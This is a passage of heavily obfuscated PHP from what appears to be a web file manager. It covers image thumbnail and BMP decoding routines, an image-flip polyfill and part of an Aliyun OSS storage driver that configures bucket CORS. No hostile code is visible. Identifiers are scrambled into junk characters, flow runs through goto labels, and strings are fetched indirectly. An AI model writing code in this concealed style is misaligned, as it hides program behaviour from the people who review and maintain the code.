$A«’—ïÜ—… >> $a½‚×§ì¤) >> $F¹ëÁ‹Ï¢Ñ - $a½‚×§ì¤]); } } } goto E£ÁŠŞğ; E£ÁŠŞğ: } else { goto e˜¯ã†ëË¾; C¸ğŒ÷¹¡“: $Fƒ­ÅÑÇ¼… = $EÂ¼Ô£ÒÌµ >> 3; $aÍ°–ÓàÏ = $D´á ÷ªŠ– ? 127 : 0; $dƒ¥¤­Ë² = $D´á ÷ªŠ– ? 1 / $D´á ÷ªŠ– : 1; goto E¿¹·¼½Å; Eİ‚¶†‹ÙÃ: for ($AùŸÓŞ¼„† = 0; $AùŸÓŞ¼„† < $AÍˆİ±å; ++$AùŸÓŞ¼„†, $eŒ¯õƒŠ¨ += $B†Ü‹Ã¿•á) { $Bï™ÈòÅõ = fread($Eáğ—Å“õê, $FŸìµà¯–Œ); if ($Bï™ÈòÅõ === !1) { imagedestroy($a·â“í³«); return !1; } $f‚‹ïŠÊáï = 0; for ($BÛ¡æ†ïÌØ = 0; $BÛ¡æ†ïÌØ < $F´ƒŒ¿Ş´ö; ++$BÛ¡æ†ïÌØ, $f‚‹ïŠÊáï += $Fƒ­ÅÑÇ¼…) { list(, $D½² àÕÁç) = unpack($b»×Üƒ¶¢‘[1810], substr($Bï™ÈòÅõ, $f‚‹ïŠÊáï, $Fƒ­ÅÑÇ¼…) . $b»×Üƒ¶¢‘[1834]); $c Â™ëˆªŠ = $D½² àÕÁç & $D´á ÷ªŠ–; $d¼ê¬³·èß = $D½² àÕÁç & $f»¨óĞÅŸ²; $aìÒñßºé˜ = $D½² àÕÁç & $aŞ£™äæ; $FŞœŸáŠ‘ğ = $D½² àÕÁç & $Aê›ŒÊŞ„ã; $d·–ÆÊ›‹ = $aÍ°–ÓàÏ - (($c Â™ëˆªŠ << 7) - $c Â™ëˆªŠ) * $dƒ¥¤­Ë²; $F¥—»¢™Ú¸ = (($d¼ê¬³·èß << 8) - $d¼ê¬³·èß) * $f‹’æ¨ñ•²; $féğŒô´Œ¤ = (($aìÒñßºé˜ << 8) - $aìÒñßºé˜) * $bÌ¥Õù—…; $a½‚×§ì¤ = (($FŞœŸáŠ‘ğ << 8) - $FŞœŸáŠ‘ğ) * $EĞ÷»º¶Şï; imagesetpixel($a·â“í³«, $BÛ¡æ†ïÌØ, $eŒ¯õƒŠ¨, $d·–ÆÊ›‹ << 24 | $F¥—»¢™Ú¸ << 16 | $féğŒô´Œ¤ << 8 | $a½‚×§ì¤); } } imagealphablending($a·â“í³«, !0); goto Eë»Ù‹ŒŒ©; e˜¯ã†ëË¾: $a·â“í³« = imagecreatetruecolor($F´ƒŒ¿Ş´ö, $AÍˆİ±å); imagealphablending($a·â“í³«, !1); if ($D´á ÷ªŠ–) { imagesavealpha($a·â“í³«, !0); } goto C¸ğŒ÷¹¡“; E¿¹·¼½Å: $f‹’æ¨ñ•² = $f»¨óĞÅŸ² ? 1 / $f»¨óĞÅŸ² : 1; $bÌ¥Õù—… = $aŞ£™äæ ? 1 / $aŞ£™äæ : 1; $EĞ÷»º¶Şï = $Aê›ŒÊŞ„ã ? 1 / $Aê›ŒÊŞ„ã : 1; goto Eİ‚¶†‹ÙÃ; Eë»Ù‹ŒŒ©: } return $a·â“í³«; goto AÛÇƒ£í; B—¤ÉŒ˜Œ: if ($Bï™ÈòÅõ === !1) { return !1; } list(, $B¼Á…æÈôÛ) = unpack($b»×Üƒ¶¢‘[1810], $Bï™ÈòÅõ); if ($B¼Á…æÈôÛ == 12) { goto C±éªØ˜Š»; AÀ±…ÕÛ÷æ: $EÈñèó›Š­ = $B…’…•ÄÚÛ = $D´á ÷ªŠ– = $AôøØÉ†ÛÄ = 0; $f»¨óĞÅŸ² = 16711680; $aŞ£™äæ = 65280; goto B·¨†ğ™¯; B·¨†ğ™¯: $Aê›ŒÊŞ„ã = 255; goto cõµ‚†ÎäÓ; C±éªØ˜Š»: $Bï™ÈòÅõ = fread($Eáğ—Å“õê, $B¼Á…æÈôÛ - 4); if ($Bï™ÈòÅõ === !1) { return !1; } extract(unpack($b»×Üƒ¶¢‘[1811] . $b»×Üƒ¶¢‘[1812] . $b»×Üƒ¶¢‘[1813] . $b»×Üƒ¶¢‘[1814], $Bï™ÈòÅõ)); goto AÀ±…ÕÛ÷æ; cõµ‚†ÎäÓ: } else { if (124 < $B¼Á…æÈôÛ || $B¼Á…æÈôÛ < 40) { return !1; } else { goto dÈÎ‰ÎÈç; dÈÎ‰ÎÈç: $Bï™ÈòÅõ = fread($Eáğ—Å“õê, 36); if ($Bï™ÈòÅõ === !1) { return !1; } extract(unpack($b»×Üƒ¶¢‘[1815] . $b»×Üƒ¶¢‘[1816] . $b»×Üƒ¶¢‘[1813] . $b»×Üƒ¶¢‘[1817] . $b»×Üƒ¶¢‘[1818] . $b»×Üƒ¶¢‘[1819] . $b»×Üƒ¶¢‘[1820] . $b»×Üƒ¶¢‘[1821] . $b»×Üƒ¶¢‘[1822] . $b»×Üƒ¶¢‘[1823], $Bï™ÈòÅõ)); goto eÕùÈÇÙÛ; c¸µİäóô: if (($EÂ¼Ô£ÒÌµ == 16 || $EÂ¼Ô£ÒÌµ == 24 || $EÂ¼Ô£ÒÌµ == 32) && $AôøØÉ†ÛÄ == 0 && $f»¨óĞÅŸ² == 0 && $aŞ£™äæ == 0 && $Aê›ŒÊŞ„ã == 0) { switch ($EÂ¼Ô£ÒÌµ) { case 16: $f»¨óĞÅŸ² = 31744; $aŞ£™äæ = 992; $Aê›ŒÊŞ„ã = 31; break; case 24: case 32: $f»¨óĞÅŸ² = 16711680; $aŞ£™äæ = 65280; $Aê›ŒÊŞ„ã = 255; break; } } goto A˜°ÜÊ×¨»; eÕùÈÇÙÛ: if ($F´ƒŒ¿Ş´ö & 2147483648) { $F´ƒŒ¿Ş´ö = -(~$F´ƒŒ¿Ş´ö & 4294967295) - 1; } if ($c“ÈÊåèµ– & 2147483648) { $c“ÈÊåèµ– = -(~$c“ÈÊåèµ– & 4294967295) - 1; } if ($FäŸ”ï‰»¹ & 2147483648) { $FäŸ”ï‰»¹ = -(~$FäŸ”ï‰»¹ & 4294967295) - 1; } goto C¬’Šˆ±¡Ç; C¬’Šˆ±¡Ç: if ($AÎÓø»”š & 2147483648) { $AÎÓø»”š = -(~$AÎÓø»”š & 4294967295) - 1; } if ($d‡¨·¼ó¶Ô[$b»×Üƒ¶¢‘[516]] != 0) { $fˆêæÍÖ² = $EÂ¼Ô£ÒÌµ == 1 || $EÂ¼Ô£ÒÌµ == 4 || $EÂ¼Ô£ÒÌµ == 8 ? ($EÈñèó›Š­ ? $EÈñèó›Š­ : pow(2, $EÂ¼Ô£ÒÌµ)) << 2 : 0; $eâóŒÎ¡ƒ = $EÏàÂ±«ö¹ ? $EÏàÂ±«ö¹ : ($F´ƒŒ¿Ş´ö * $EÂ¼Ô£ÒÌµ + 31 >> 3 & ~3) * abs($c“ÈÊåèµ–); $FŒóŠá˜¤ = $d‡¨·¼ó¶Ô[$b»×Üƒ¶¢‘[516]] - $eâóŒÎ¡ƒ - $fˆêæÍÖ² - 14; if ($B¼Á…æÈôÛ < $FŒóŠá˜¤ && 40 <= $B¼Á…æÈôÛ && $B¼Á…æÈôÛ <= 124) { $B¼Á…æÈôÛ = $FŒóŠá˜¤; } } if ($B¼Á…æÈôÛ - 40 > 0) { $Bï™ÈòÅõ = fread($Eáğ—Å“õê, $B¼Á…æÈôÛ - 40); if ($Bï™ÈòÅõ === !1) { return !1; } extract(unpack($b»×Üƒ¶¢‘[1824] . $b»×Üƒ¶¢‘[1825] . $b»×Üƒ¶¢‘[1826] . $b»×Üƒ¶¢‘[1827], $Bï™ÈòÅõ . str_repeat($b»×Üƒ¶¢‘[1828], 120))); } else { $D´á ÷ªŠ– = $f»¨óĞÅŸ² = $aŞ£™äæ = $Aê›ŒÊŞ„ã = 0; } goto c¸µİäóô; A˜°ÜÊ×¨»: } } goto E‘©ÜßÏå“; d³Ò¢™è¤ù: $b»×Üƒ¶¢‘ =& $_SERVER[¢à]; if ($d‡¨·¼ó¶Ô[$b»×Üƒ¶¢‘[385]] != 19778) { return !1; } $Bï™ÈòÅõ = fread($Eáğ—Å“õê, 4); goto B—¤ÉŒ˜Œ; dÛÂØœÛ: $AÍˆİ±å = abs($c“ÈÊåèµ–); $eŒ¯õƒŠ¨ = $c“ÈÊåèµ– > 0 ? $AÍˆİ±å - 1 : 0; $B†Ü‹Ã¿•á = $c“ÈÊåèµ– > 0 ? -1 : 1; goto d¸‘‚–»«; AÛÇƒ£í: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($BÓã³½”…½, $E¶Á£Èè²») { goto EøÎ”ì™; a·ïĞâ±Ú: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto f®…Ä™ñ§é; AĞŸ¤´­’ª: if (!$this->im) { return !1; } $Cë‡„ˆİâì = $_SERVER[¢à][33]; $this->imgData = GetImageSize($BÓã³½”…½, $Cë‡„ˆİâì); goto a·ïĞâ±Ú; EøÎ”ì™: $this->srcFile = $BÓã³½”…½; $this->echoType = $E¶Á£Èè²»; $this->im = self::image($BÓã³½”…½); goto AĞŸ¤´­’ª; f®…Ä™ñ§é: } public static function image($F›Œ§Õ­­) { $dƒŒÔƒ¤¢º =& $_SERVER[¢à]; $DóÁä¶Çê = $dƒŒÔƒ¤¢º[33]; $E„¦îäŸ¿© = GetImageSize($F›Œ§Õ­­, $DóÁä¶Çê); $BÙ‚…œíÏí = !1; switch ($E„¦îäŸ¿©[2]) { case IMAGETYPE_GIF: if (!function_exists($dƒŒÔƒ¤¢º[1835])) { break; } $BÙ‚…œíÏí = imagecreatefromgif($F›Œ§Õ­­); break; case IMAGETYPE_JPEG: if (!function_exists($dƒŒÔƒ¤¢º[1836])) { break; } $BÙ‚…œíÏí = imagecreatefromjpeg($F›Œ§Õ­­); break; case IMAGETYPE_PNG: if (!function_exists($dƒŒÔƒ¤¢º[1837])) { break; } $BÙ‚…œíÏí = @imagecreatefrompng($F›Œ§Õ­­); imagesavealpha($BÙ‚…œíÏí, !0); break; case IMAGETYPE_XBM: $BÙ‚…œíÏí = imagecreatefromxbm($F›Œ§Õ­­); break; case IMAGETYPE_WBMP: $BÙ‚…œíÏí = imagecreatefromwbmp($F›Œ§Õ­­); break; case IMAGETYPE_BMP: $BÙ‚…œíÏí = imagecreatefrombmp($F›Œ§Õ­­); break; default: break; } return $BÙ‚…œíÏí; } public static function imageSize($FÖò†ôÉ¶š) { $CùÚåÕÃˆÉ =& $_SERVER[¢à]; $C’ÚÊÂ»ç‡ = GetImageSize($FÖò†ôÉ¶š); if (!$C’ÚÊÂ»ç‡) { return !1; } return array($CùÚåÕÃˆÉ[1838] => $C’ÚÊÂ»ç‡[0], $CùÚåÕÃˆÉ[1839] => $C’ÚÊÂ»ç‡[1]); } function distortion($f°°˜ËÔ”, $bì§ ¼ŠÂ¶, $FË™ÍÂ¼¦¬) { $f¥•ã‡îõÜ = $this->creatImage($this->im, $bì§ ¼ŠÂ¶, $FË™ÍÂ¼¦¬, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($f¥•ã‡îõÜ, $f°°˜ËÔ”); } function prorate($cÌóÏó‡‰ë, $a‰£ Ÿ±«À, $b¥â„‹ù‰ƒ) { $fƒºœ×óÕ“ = $a‰£ Ÿ±«À / $b¥â„‹ù‰ƒ; $a‚Ÿ‘àÔèä = $this->srcW / $this->srcH; if ($fƒºœ×óÕ“ <= $a‚Ÿ‘àÔèä) { $b°öñ×²° = $a‰£ Ÿ±«À; $A÷‚ƒ¹Ìà = $b°öñ×²° * ($this->srcH / $this->srcW); } else { $A÷‚ƒ¹Ìà = $b¥â„‹ù‰ƒ; $b°öñ×²° = $A÷‚ƒ¹Ìà * ($this->srcW / $this->srcH); } if ($this->srcW > $a‰£ Ÿ±«À || $this->srcH > $b¥â„‹ù‰ƒ) { $B˜±«ÍãÊ” = $this->creatImage($this->im, $b°öñ×²°, $A÷‚ƒ¹Ìà, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($B˜±«ÍãÊ”, $cÌóÏó‡‰ë); } else { $B˜±«ÍãÊ” = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($B˜±«ÍãÊ”, $cÌóÏó‡‰ë); } } function cut($d½§®ØÙ‹, $BÌº¨‹…», $c‹¨Â¾¯ñœ) { goto dÈùëäĞõÛ; dÈùëäĞõÛ: $c¨â¨àŒ¶ = $BÌº¨‹…» / $c‹¨Â¾¯ñœ; $d™ƒ†ˆèÊ = $this->srcW / $this->srcH; if ($c¨â¨àŒ¶ <= $d™ƒ†ˆèÊ) { $Bç×Šîã¶Í = $c‹¨Â¾¯ñœ; $BõØŒñÁÜˆ = $Bç×Šîã¶Í * ($this->srcW / $this->srcH); } else { $BõØŒñÁÜˆ = $BÌº¨‹…»; $Bç×Šîã¶Í = $BõØŒñÁÜˆ * ($this->srcH / $this->srcW); } goto dÙîÊÃ«åê; e·¸Î©œ: return $this->echoImage($C”×”×Ëó, $d½§®ØÙ‹); goto d‚¤óŞ¾ÊÒ; dÙîÊÃ«åê: $A¢†®— º¼ = $this->creatImage($this->im, $BõØŒñÁÜˆ, $Bç×Šîã¶Í, 0, 0, 0, 0, $this->srcW, $this->srcH); $C”×”×Ëó = $this->creatImage($A¢†®— º¼, $BÌº¨‹…», $c‹¨Â¾¯ñœ, 0, 0, ($BõØŒñÁÜˆ - $BÌº¨‹…») / 2, ($Bç×Šîã¶Í - $c‹¨Â¾¯ñœ) / 2, $BÌº¨‹…», $c‹¨Â¾¯ñœ); imageDestroy($A¢†®— º¼); goto e·¸Î©œ; d‚¤óŞ¾ÊÒ: } function backFill($Eæó’ËØÍÁ, $CŒ×Û‘Òˆ, $BîöŞ“†¬, $fŸ‰‹×İÙ = false, $b´‚–Öğë = 255, $EĞâÜãŠï = 255, $b—œ„…ĞÃœ = 255) { goto EÁ–¾²˜£Œ; EÁ–¾²˜£Œ: $cÇ¼ ˆŒ” = $CŒ×Û‘Òˆ / $BîöŞ“†¬; $a÷Ñ—¥‰¹Õ = $this->srcW / $this->srcH; if ($cÇ¼ ˆŒ” <= $a÷Ñ—¥‰¹Õ) { $C•†ãò‰¡‚ = $CŒ×Û‘Òˆ; $a®¹˜ß²²Ÿ = $C•†ãò‰¡‚ * ($this->srcH / $this->srcW); } else { $a®¹˜ß²²Ÿ = $BîöŞ“†¬; $C•†ãò‰¡‚ = $a®¹˜ß²²Ÿ * ($this->srcW / $this->srcH); } goto Bš“˜¨†©‹; B’‚°ê·ùè: if ($fŸ‰‹×İÙ) { $b¸ˆˆè·…© = imageColorTransparent($Aù£‘±ñ½Õ, $b¸ˆˆè·…©); $D¤ß¦Š¼Ù— = $BîöŞ“†¬ - $a®¹˜ß²²Ÿ; } imageFilledRectangle($Aù£‘±ñ½Õ, 0, 0, $CŒ×Û‘Òˆ, $BîöŞ“†¬, $b¸ˆˆè·…©); if ($this->srcW > $CŒ×Û‘Òˆ || $this->srcH > $BîöŞ“†¬) { $F•†•¯¯¢¨ = $this->creatImage($this->im, $C•†ãò‰¡‚, $a®¹˜ß²²Ÿ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($C•†ãò‰¡‚ < $CŒ×Û‘Òˆ) { imageCopy($Aù£‘±ñ½Õ, $F•†•¯¯¢¨, ($CŒ×Û‘Òˆ - $C•†ãò‰¡‚) / 2, 0, 0, 0, $C•†ãò‰¡‚, $a®¹˜ß²²Ÿ); } else { if ($a®¹˜ß²²Ÿ < $BîöŞ“†¬) { imageCopy($Aù£‘±ñ½Õ, $F•†•¯¯¢¨, 0, $D¤ß¦Š¼Ù—, 0, 0, $C•†ãò‰¡‚, $a®¹˜ß²²Ÿ); } else { imageCopy($Aù£‘±ñ½Õ, $F•†•¯¯¢¨, 0, 0, 0, 0, $C•†ãò‰¡‚, $a®¹˜ß²²Ÿ); } } } else { imageCopyMerge($Aù£‘±ñ½Õ, $this->im, ($CŒ×Û‘Òˆ - $C•†ãò‰¡‚) / 2, $D¤ß¦Š¼Ù—, 0, 0, $C•†ãò‰¡‚, $a®¹˜ß²²Ÿ, 100); } goto f¡İàà®©; f¡İàà®©: return $this->echoImage($Aù£‘±ñ½Õ, $Eæó’ËØÍÁ); goto dæ³ŞšœÎ; Bš“˜¨†©‹: if (function_exists($_SERVER[¢à][1840])) { @($Aù£‘±ñ½Õ = imageCreateTrueColor($CŒ×Û‘Òˆ, $BîöŞ“†¬)); if (!$Aù£‘±ñ½Õ) { $Aù£‘±ñ½Õ = imageCreate($CŒ×Û‘Òˆ, $BîöŞ“†¬); } } else { $Aù£‘±ñ½Õ = imageCreate($CŒ×Û‘Òˆ, $BîöŞ“†¬); } $D¤ß¦Š¼Ù— = ($BîöŞ“†¬ - $a®¹˜ß²²Ÿ) / 2; $b¸ˆˆè·…© = imagecolorallocate($Aù£‘±ñ½Õ, $b´‚–Öğë, $EĞâÜãŠï, $b—œ„…ĞÃœ); goto B’‚°ê·ùè; dæ³ŞšœÎ: } function creatImage($f¨»×òà„¤, $E‡…„ê, $D¬ç…æŒğ, $C‘ØÏÈ, $EšÀÎ¿‰ÜÚ, $F¾µáéÃ—¡, $FÂ¡Æé“Í, $F×Öˆ˜‘ï, $d°Ÿ×‚ëë) { if (function_exists($_SERVER[¢à][1840])) { @($b¼ìº¸¬¿ğ = ImageCreateTrueColor($E‡…„ê, $D¬ç…æŒğ)); @imagealphablending($b¼ìº¸¬¿ğ, !1); @imagesavealpha($b¼ìº¸¬¿ğ, !0); if ($b¼ìº¸¬¿ğ) { imageCopyResampled($b¼ìº¸¬¿ğ, $f¨»×òà„¤, $C‘ØÏÈ, $EšÀÎ¿‰ÜÚ, $F¾µáéÃ—¡, $FÂ¡Æé“Í, $E‡…„ê, $D¬ç…æŒğ, $F×Öˆ˜‘ï, $d°Ÿ×‚ëë); } else { $b¼ìº¸¬¿ğ = ImageCreate($E‡…„ê, $D¬ç…æŒğ); imageCopyResized($b¼ìº¸¬¿ğ, $f¨»×òà„¤, $C‘ØÏÈ, $EšÀÎ¿‰ÜÚ, $F¾µáéÃ—¡, $FÂ¡Æé“Í, $E‡…„ê, $D¬ç…æŒğ, $F×Öˆ˜‘ï, $d°Ÿ×‚ëë); } } else { $b¼ìº¸¬¿ğ = ImageCreate($E‡…„ê, $D¬ç…æŒğ); imageCopyResized($b¼ìº¸¬¿ğ, $f¨»×òà„¤, $C‘ØÏÈ, $EšÀÎ¿‰ÜÚ, $F¾µáéÃ—¡, $FÂ¡Æé“Í, $E‡…„ê, $D¬ç…æŒğ, $F×Öˆ˜‘ï, $d°Ÿ×‚ëë); } return $b¼ìº¸¬¿ğ; } public function imgRotate($b‹ªÎ¼¸ô­, $fİ³ªØ·ƒË) { goto aè¢á¾÷; aè¢á¾÷: if (!$this->im || $fİ³ªØ·ƒË % 360 === 0 || !function_exists($_SERVER[¢à][1841])) { return !1; } $d‘ßà‚ÀÄö = imageRotate($this->im, 360 - $fİ³ªØ·ƒË, 0); $Aë»Ó‘é…µ = !1; goto dÅ¢¥”­ò; b”¾÷™—Õë: return $Aë»Ó‘é…µ; goto Cº¶ìªˆÊğ; dÅ¢¥”­ò: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $Aë»Ó‘é…µ = imagegif($d‘ßà‚ÀÄö, $b‹ªÎ¼¸ô­); break; case IMAGETYPE_JPEG: $Aë»Ó‘é…µ = imagejpeg($d‘ßà‚ÀÄö, $b‹ªÎ¼¸ô­, 100); break; case IMAGETYPE_PNG: $Aë»Ó‘é…µ = imagePNG($d‘ßà‚ÀÄö, $b‹ªÎ¼¸ô­); break; default: break; } imageDestroy($d‘ßà‚ÀÄö); imageDestroy($this->im); goto b”¾÷™—Õë; Cº¶ìªˆÊğ: } function echoImage($DéĞ•ÁŠ¨, $Cµ ·†šÑÔ) { goto eÜâªÕĞ¨; cçÙ‘›ŸëØ: imageDestroy($this->im); return $AŠíè•£Û; goto dˆ½ßèñˆ„; eÜâªÕĞ¨: $Fñ¾Á„ã³Ì =& $_SERVER[¢à]; if (!$DéĞ•ÁŠ¨) { return !1; } ob_get_clean(); goto c±‹¥ñ–±¬; c±‹¥ñ–±¬: $AŠíè•£Û = !1; switch ($this->echoType) { case $Fñ¾Á„ã³Ì[1842]: $AŠíè•£Û = imagePNG($DéĞ•ÁŠ¨); break; case $Fñ¾Á„ã³Ì[164]: $AŠíè•£Û = imagePNG($DéĞ•ÁŠ¨, $Cµ ·†šÑÔ); break; } imageDestroy($DéĞ•ÁŠ¨); goto cçÙ‘›ŸëØ; dˆ½ßèñˆ„: } } if (!function_exists($_SERVER[¢à][1843])) { define($_SERVER[¢à][1844], 0); define($_SERVER[¢à][1845], 1); define($_SERVER[¢à][1846], 2); function imageflip($d¤òŸŸáÜÀ, $AŞŞ¾†Î¡í) { switch ($AŞŞ¾†Î¡í) { case IMG_FLIP_HORIZONTAL: $cã‹Íï· = imagesx($d¤òŸŸáÜÀ) - 1; $cÜ‘Í†µå = $cã‹Íï· / 2; $bäõ™ğªç¸ = imagesy($d¤òŸŸáÜÀ); $CÈ÷¹¹•¢ = imageistruecolor($d¤òŸŸáÜÀ) ? imagecreatetruecolor(1, $bäõ™ğªç¸) : imagecreate(1, $bäõ™ğªç¸); for ($a¤Èñ›—© = 0; $a¤Èñ›—© < $cÜ‘Í†µå; ++$a¤Èñ›—©) { imagecopy($CÈ÷¹¹•¢, $d¤òŸŸáÜÀ, 0, 0, $a¤Èñ›—©, 0, 1, $bäõ™ğªç¸); imagecopy($d¤òŸŸáÜÀ, $d¤òŸŸáÜÀ, $a¤Èñ›—©, 0, $cã‹Íï· - $a¤Èñ›—©, 0, 1, $bäõ™ğªç¸); imagecopy($d¤òŸŸáÜÀ, $CÈ÷¹¹•¢, $cã‹Íï· - $a¤Èñ›—©, 0, 0, 0, 1, $bäõ™ğªç¸); } break; case IMG_FLIP_VERTICAL: $FªçŒ®µÀš = imagesx($d¤òŸŸáÜÀ); $FÜö¶±õÅØ = imagesy($d¤òŸŸáÜÀ) - 1; $f’ëŸíËˆ¸ = $FÜö¶±õÅØ / 2; $CÈ÷¹¹•¢ = imageistruecolor($d¤òŸŸáÜÀ) ? imagecreatetruecolor($FªçŒ®µÀš, 1) : imagecreate($FªçŒ®µÀš, 1); for ($E…½ÊŸœ = 0; $E…½ÊŸœ < $f’ëŸíËˆ¸; ++$E…½ÊŸœ) { imagecopy($CÈ÷¹¹•¢, $d¤òŸŸáÜÀ, 0, 0, 0, $E…½ÊŸœ, $FªçŒ®µÀš, 1); imagecopy($d¤òŸŸáÜÀ, $d¤òŸŸáÜÀ, 0, $E…½ÊŸœ, 0, $FÜö¶±õÅØ - $E…½ÊŸœ, $FªçŒ®µÀš, 1); imagecopy($d¤òŸŸáÜÀ, $CÈ÷¹¹•¢, 0, $FÜö¶±õÅØ - $E…½ÊŸœ, 0, 0, $FªçŒ®µÀš, 1); } break; case IMG_FLIP_BOTH: $FªçŒ®µÀš = imagesx($d¤òŸŸáÜÀ); $bäõ™ğªç¸ = imagesy($d¤òŸŸáÜÀ); $CÈ÷¹¹•¢ = imagerotate($d¤òŸŸáÜÀ, 180, 0); imagecopy($d¤òŸŸáÜÀ, $CÈ÷¹¹•¢, 0, 0, 0, 0, $FªçŒ®µÀš, $bäõ™ğªç¸); break; default: return; } imagedestroy($CÈ÷¹¹•¢); } } goto cÄÙí˜´Æé; fÍòŠäœÜ™: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($E¬÷İ…¿ƒ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¢à][1160]; $this->_init($E¬÷İ…¿ƒ); } public function _init($c¦ŒÕ‚ñ«Ô) { foreach ($c¦ŒÕ‚ñ«Ô as $eµÊ«¦á‰‰ => $aÖ¼°‚Ãë´) { if (isset($this->{$eµÊ«¦á‰‰})) { $this->{$eµÊ«¦á‰‰} = $aÖ¼°‚Ãë´; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¢à][1161], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto C”·ºÜ¥Ô; EïˆÍä½íÕ: $fš¡ƒ¬‚¬´->addRule($b‡áÙ¥šÉ); try { $this->client->putBucketCors($this->bucket, $fš¡ƒ¬‚¬´); } catch (OSS\Core\OssException $BãºŠœ±) { return !1; } return !0; goto cõ¤„êæ¨; FÒ‘ÎÔƒÂŠ: $b‡áÙ¥šÉ->setMaxAgeSeconds(600); $b‡áÙ¥šÉ->addExposeHeader($eÃ‰÷„õ÷‘[1167]); $b‡áÙ¥šÉ->addAllowedHeader($eÃ‰÷„õ÷‘[1162]); goto EïˆÍä½íÕ; E‹¯áƒÒö: $b‡áÙ¥šÉ->addAllowedOrigin($eÃ‰÷„õ÷‘[1162]); $b‡áÙ¥šÉ->addAllowedMethod($eÃ‰÷„õ÷‘[1163]); $b‡áÙ¥šÉ->addAllowedMethod($eÃ‰÷„õ÷‘[1164]); goto a–¦ãÜ§÷; a–¦ãÜ§÷: $b‡áÙ¥šÉ->addAllowedMethod($eÃ‰÷„õ÷‘[1165]); $b‡áÙ¥šÉ->addAllowedMethod($eÃ‰÷„õ÷‘[1166]); $b‡áÙ¥šÉ->addAllowedMethod($eÃ‰÷„õ÷‘[152]); goto FÒ‘ÎÔƒÂŠ; C”·ºÜ¥Ô: $eÃ‰÷„õ÷‘ =& $_SERVER[¢à]; $fš¡ƒ¬‚¬´ = new OSS\Model\CorsConfig(); $b‡áÙ¥šÉ = new OSS\Model\CorsRule(); goto E‹¯áƒÒö; cõ¤„êæ¨: } public function getBucketCors() { goto E¼‡š„…Âœ; E…öÚ¤ã÷Û: $f²ÉØØ¿‹ = $aË“å´ Ã[0]->getMaxAgeSeconds(); $AÒ§ƒÕ¬‚Â = $aË“å´ Ã[0]->getExposeHeaders(); $B‡î¬ö±‹æ = $aË“å´ Ã[0]->getAllowedHeaders(); goto AÀÑ¾ÎòË›; Eß– ¹“ŠÎ: if (!$eÂ¬ó÷¹ïñ || !($aË“å´ Ã = $eÂ¬ó÷¹ïñ->getRules())) { return null; } $Fùœìò‰É = $aË“å´ Ã[0]->getAllowedOrigins(); $f„Ü‚¿ÓÁÆ = $aË“å´ Ã[0]->getAllowedMethods(); goto E…öÚ¤ã÷Û; AÀÑ¾ÎòË›: return array($D¬ô³ˆ®²[172] => isset($Fùœìò‰É[0]) ? $Fùœìò‰É[0] : $D¬ô³ˆ®²[33], $D¬ô³ˆ®²[176] => $f„Ü‚¿ÓÁÆ, $D¬ô³ˆ®²[1168] => $f²ÉØØ¿‹, $D¬ô³ˆ®²[1169] => isset($AÒ§ƒÕ¬‚Â[0]) ? $AÒ§ƒÕ¬‚Â[0] : $D¬ô³ˆ®²[33], $D¬ô³ˆ®²[174] => isset($B‡î¬ö±‹æ[0]) ? $B‡î¬ö±‹æ[0] : $D¬ô³ˆ®²[33]); goto f‡ºÈñ; E¼‡š„…Âœ: $D¬ô³ˆ®² =& $_SERVER[¢à]; $eÂ¬ó÷¹ïñ = null; try { $eÂ¬ó÷¹ïñ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $EŒÙ¶¤ÖÂ) { return null; } goto Eß– ¹“ŠÎ; f‡ºÈñ: } public function isBucketCors() { goto BäÉø»„é; cİäö°Â: $D‚”¤¬«‘ = array($fÅÕéø„ñ[177], $fÅÕéø„ñ[178], $fÅÕéø„ñ[179], $fÅÕéø„ñ[180], $fÅÕéø„ñ[181]); $D°å—“ = array_diff($D‚”¤¬«‘, $a½à‹–¢Ü•); return empty($D°å—“); goto e´© ÃŒÜ; BäÉø»„é: $fÅÕéø„ñ =& $_SERVER[¢à]; $d™ÉäÍøî = $this->getBucketCors(); if (!$d™ÉäÍøî || !is_array($d™ÉäÍøî)) { return !1; } goto b«®ŠƒâÏ©; b«®ŠƒâÏ©: if ($d™ÉäÍøî[$fÅÕéø„ñ[172]] != $fÅÕéø„ñ[173] || $d™ÉäÍøî[$fÅÕéø„ñ[174]] != $fÅÕéø„ñ[173]) { return !1; } $a½à‹–¢Ü• = array_map($fÅÕéø„ñ[175], $d™ÉäÍøî[$fÅÕéø„ñ[176]]); if (!is_array($a½à‹–¢Ü•)) { $a½à‹–¢Ü• = array(); } goto cİäö°Â; e´© ÃŒÜ: } public function mkfile($cìÊ´®¡ç, $D¾æëñéæƒ = '', $bÕ“»¡ª…š = REPEAT_RENAME) { $Cºµ‰ÙÑÇ¼ = $this->setContent($cìÊ´®¡ç, $D¾æëñéæƒ); if ($Cºµ‰ÙÑÇ¼ !== !1) { return $this->getPathOuter($cìÊ´®¡ç); } return !1; } public function mkdir($a®ÍÔ‹‘Ëµ, $Bß‰ëåŸ = REPEAT_SKIP) { if ($this->_isFolder($a®ÍÔ‹‘Ëµ)) { return $this->getPathOuter($a®ÍÔ‹‘Ëµ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($a®ÍÔ‹‘Ëµ)); } catch (OSS\Core\OssException $aìÉé’à½) { return !1; } return $this->getPathOuter($a®ÍÔ‹‘Ëµ); } private function fileList($B› Éó•³³, $a†ÃÑíîºÛ = '', $aĞÈãö”¬ = 0) { goto Aæ¤ôèïÏ; a¢ğŠîì÷¼: $eœƒ³¹¿Û = $aÊè÷È‡³ƒ[33]; 